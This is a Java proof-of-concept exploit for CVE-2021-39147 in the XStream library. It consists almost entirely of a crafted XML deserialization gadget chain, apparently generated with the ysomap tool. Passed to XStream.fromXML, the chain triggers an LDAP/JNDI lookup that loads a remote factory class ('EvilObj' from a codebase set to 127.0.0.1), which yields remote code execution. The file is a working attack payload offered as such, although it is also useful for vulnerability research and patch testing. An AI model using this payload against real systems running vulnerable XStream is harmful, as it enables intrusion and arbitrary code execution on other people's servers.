package com.r17a.xstream.cve.sortedset;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_39147 {
    public static void main(String[] args) {
        String xml = "<sorted-set>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>ysomap</type>\n" +
                "    <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n" +
                "      <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n" +
                "        <parsedMessage>true</parsedMessage>\n" +
                "        <soapVersion>SOAP_11</soapVersion>\n" +
                "        <bodyParts/>\n" +
                "        <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n" +
                "          <attachmentsInitialized>false</attachmentsInitialized>\n" +
                "          <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>\n" +
                "            <soapPart/>\n" +
                "            <mm>\n" +
                "              <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n" +
                "                <aliases class='com.sun.jndi.ldap.LdapSearchEnumeration'>\n" +
                "                  <listArg class='javax.naming.CompoundName' serialization='custom'>\n" +
                "                    <javax.naming.CompoundName>\n" +
                "                      <properties/>\n" +
                "                      <int>1</int>\n" +
                "                      <string>ysomap</string>\n" +
                "                    </javax.naming.CompoundName>\n" +
                "                  </listArg>\n" +
                "                  <cleaned>false</cleaned>\n" +
                "                  <res>\n" +
                "                    <msgId>0</msgId>\n" +
                "                    <status>0</status>\n" +
                "                  </res>\n" +
                "                  <enumClnt>\n" +
                "                    <isLdapv3>false</isLdapv3>\n" +
                "                    <referenceCount>0</referenceCount>\n" +
                "                    <pooled>false</pooled>\n" +
                "                    <authenticateCalled>false</authenticateCalled>\n" +
                "                  </enumClnt>\n" +
                "                  <limit>1</limit>\n" +
                "                  <posn>0</posn>\n" +
                "                  <homeCtx>\n" +
                "                    <__contextType>0</__contextType>\n" +
                "                    <port__number>1099</port__number>\n" +
                "                    <hostname>127.0.0.1</hostname>\n" +
                "                    <clnt reference='../../enumClnt'/>\n" +
                "                    <handleReferrals>0</handleReferrals>\n" +
                "                    <hasLdapsScheme>true</hasLdapsScheme>\n" +
                "                    <netscapeSchemaBug>false</netscapeSchemaBug>\n" +
                "                    <referralHopLimit>0</referralHopLimit>\n" +
                "                    <batchSize>0</batchSize>\n" +
                "                    <deleteRDN>false</deleteRDN>\n" +
                "                    <typesOnly>false</typesOnly>\n" +
                "                    <derefAliases>0</derefAliases>\n" +
                "                    <addrEncodingSeparator/>\n" +
                "                    <connectTimeout>0</connectTimeout>\n" +
                "                    <readTimeout>0</readTimeout>\n" +
                "                    <waitForReply>false</waitForReply>\n" +
                "                    <replyQueueSize>0</replyQueueSize>\n" +
                "                    <useSsl>false</useSsl>\n" +
                "                    <useDefaultPortNumber>false</useDefaultPortNumber>\n" +
                "                    <parentIsLdapCtx>false</parentIsLdapCtx>\n" +
                "                    <hopCount>0</hopCount>\n" +
                "                    <unsolicited>false</unsolicited>\n" +
                "                    <sharable>false</sharable>\n" +
                "                    <enumCount>1</enumCount>\n" +
                "                    <closeRequested>false</closeRequested>\n" +
                "                  </homeCtx>\n" +
                "                  <more>true</more>\n" +
                "                  <hasMoreCalled>true</hasMoreCalled>\n" +
                "                  <startName class='javax.naming.ldap.LdapName' serialization='custom'>\n" +
                "                    <javax.naming.ldap.LdapName>\n" +
                "                      <default/>\n" +
                "                      <string>uid=ysomap,ou=oa,dc=example,dc=com</string>\n" +
                "                    </javax.naming.ldap.LdapName>\n" +
                "                  </startName>\n" +
                "                  <searchArgs>\n" +
                "                    <name class='javax.naming.CompoundName' reference='../../listArg'/>\n" +
                "                    <filter>ysomap</filter>\n" +
                "                    <cons>\n" +
                "                      <searchScope>1</searchScope>\n" +
                "                      <timeLimit>0</timeLimit>\n" +
                "                      <derefLink>false</derefLink>\n" +
                "                      <returnObj>true</returnObj>\n" +
                "                      <countLimit>0</countLimit>\n" +
                "                    </cons>\n" +
                "                    <reqAttrs/>\n" +
                "                  </searchArgs>\n" +
                "                  <entries>\n" +
                "                    <com.sun.jndi.ldap.LdapEntry>\n" +
                "                      <DN>uid=songtao.xu,ou=oa,dc=example,dc=com</DN>\n" +
                "                      <attributes class='javax.naming.directory.BasicAttributes' serialization='custom'>\n" +
                "                        <default>\n" +
                "                          <ignoreCase>false</ignoreCase>\n" +
                "                        </default>\n" +
                "                        <int>4</int>\n" +
                "                        <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\n" +
                "                          <javax.naming.directory.BasicAttribute>\n" +
                "                            <default>\n" +
                "                              <ordered>false</ordered>\n" +
                "                              <attrID>objectClass</attrID>\n" +
                "                            </default>\n" +
                "                            <int>1</int>\n" +
                "                            <string>javaNamingReference</string>\n" +
                "                          </javax.naming.directory.BasicAttribute>\n" +
                "                          <com.sun.jndi.ldap.LdapAttribute>\n" +
                "                            <default>\n" +
                "                              <rdn class=''javax.naming.CompositeName'' serialization=''custom''>\n" +
                "                                <javax.naming.CompositeName>\n" +
                "                                  <int>0</int>\n" +
                "                                </javax.naming.CompositeName>\n" +
                "                              </rdn>\n" +
                "                            </default>\n" +
                "                          </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                        </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                        <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\n" +
                "                          <javax.naming.directory.BasicAttribute>\n" +
                "                            <default>\n" +
                "                              <ordered>false</ordered>\n" +
                "                              <attrID>javaCodeBase</attrID>\n" +
                "                            </default>\n" +
                "                            <int>1</int>\n" +
                "                            <string>http://127.0.0.1/</string>\n" +
                "                          </javax.naming.directory.BasicAttribute>\n" +
                "                          <com.sun.jndi.ldap.LdapAttribute>\n" +
                "                            <default>\n" +
                "                              <rdn class=''javax.naming.CompositeName'' serialization=''custom''>\n" +
                "                                <javax.naming.CompositeName>\n" +
                "                                  <int>0</int>\n" +
                "                                </javax.naming.CompositeName>\n" +
                "                              </rdn>\n" +
                "                            </default>\n" +
                "                          </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                        </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                        <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\n" +
                "                          <javax.naming.directory.BasicAttribute>\n" +
                "                            <default>\n" +
                "                              <ordered>false</ordered>\n" +
                "                              <attrID>javaClassName</attrID>\n" +
                "                            </default>\n" +
                "                            <int>1</int>\n" +
                "                            <string>foo</string>\n" +
                "                          </javax.naming.directory.BasicAttribute>\n" +
                "                          <com.sun.jndi.ldap.LdapAttribute>\n" +
                "                            <default>\n" +
                "                              <rdn class=''javax.naming.CompositeName'' serialization=''custom''>\n" +
                "                                <javax.naming.CompositeName>\n" +
                "                                  <int>0</int>\n" +
                "                                </javax.naming.CompositeName>\n" +
                "                              </rdn>\n" +
                "                            </default>\n" +
                "                          </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                        </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                        <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\n" +
                "                          <javax.naming.directory.BasicAttribute>\n" +
                "                            <default>\n" +
                "                              <ordered>false</ordered>\n" +
                "                              <attrID>javaFactory</attrID>\n" +
                "                            </default>\n" +
                "                            <int>1</int>\n" +
                "                            <string>EvilObj</string>\n" +
                "                          </javax.naming.directory.BasicAttribute>\n" +
                "                          <com.sun.jndi.ldap.LdapAttribute>\n" +
                "                            <default>\n" +
                "                              <rdn class=''javax.naming.CompositeName'' serialization=''custom''>\n" +
                "                                <javax.naming.CompositeName>\n" +
                "                                  <int>0</int>\n" +
                "                                </javax.naming.CompositeName>\n" +
                "                              </rdn>\n" +
                "                            </default>\n" +
                "                          </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                        </com.sun.jndi.ldap.LdapAttribute>\n" +
                "                      </attributes>\n" +
                "                    </com.sun.jndi.ldap.LdapEntry>\n" +
                "                  </entries>\n" +
                "                </aliases>\n" +
                "              </it>\n" +
                "            </mm>\n" +
                "          </multiPart>\n" +
                "        </sm>\n" +
                "      </message>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>ysomap</type>\n" +
                "    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n" +
                "      <m__obj class='string'>test</m__obj>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "</sorted-set>";
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
